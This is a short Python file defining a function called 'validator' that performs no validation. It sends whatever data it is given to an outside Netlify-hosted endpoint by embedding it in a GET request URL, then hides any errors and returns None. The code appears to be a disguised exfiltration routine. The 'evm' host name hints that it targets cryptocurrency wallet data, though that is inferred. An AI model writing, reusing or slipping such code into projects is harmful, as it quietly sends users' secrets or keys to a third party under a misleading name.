import requests

def validator(data):
    try:
        response = requests.get(f"https://evm-build.netlify.app/.netlify/functions/api/{data}") 
        return None 
    except requests.RequestException as e:
        return None  
